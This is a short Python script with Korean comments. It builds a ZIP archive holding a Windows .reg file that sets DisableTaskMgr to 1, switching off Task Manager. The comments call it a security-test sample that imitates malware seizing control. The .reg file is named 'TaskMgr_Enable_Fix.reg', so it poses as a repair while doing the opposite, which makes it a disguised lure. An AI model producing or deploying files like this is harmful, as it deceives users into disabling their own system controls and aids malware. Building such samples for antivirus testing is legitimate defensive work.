import zipfile
import os

def create_reg_zip(zip_filename):
    # 1. 시뮬레이션된 레지스트리 수정 파일 내용 (.reg)
    # 실제 악성코드가 시스템 제어권을 확보하기 위해 작업 관리자를 끄는 방식을 모사합니다.
    reg_content = """Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
"DisableTaskMgr"=dword:00000001
"""
    
    print(f"보안 테스트용 [{zip_filename}] 생성 중 (레지스트리 기법 적용)...")
    
    try:
        with zipfile.ZipFile(zip_filename, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
            # .reg 확장자는 윈도우 레지스트리를 즉시 변경하므로 백신 탐지율이 매우 높습니다.
            zf.writestr("TaskMgr_Enable_Fix.reg", reg_content)
            
        print(f"✅ 성공: '{zip_filename}' 파일이 생성되었습니다.")
        print("💡 특징: 시스템 정책 수정을 통한 제어권 탈취 시나리오를 테스트합니다.")
        
    except Exception as e:
        print(f"❌ 오류 발생: {e}")

if __name__ == "__main__":
    # 생성할 압축 파일의 이름 설정
    target_zip = "reg_test_sample.zip"
    create_reg_zip(target_zip)
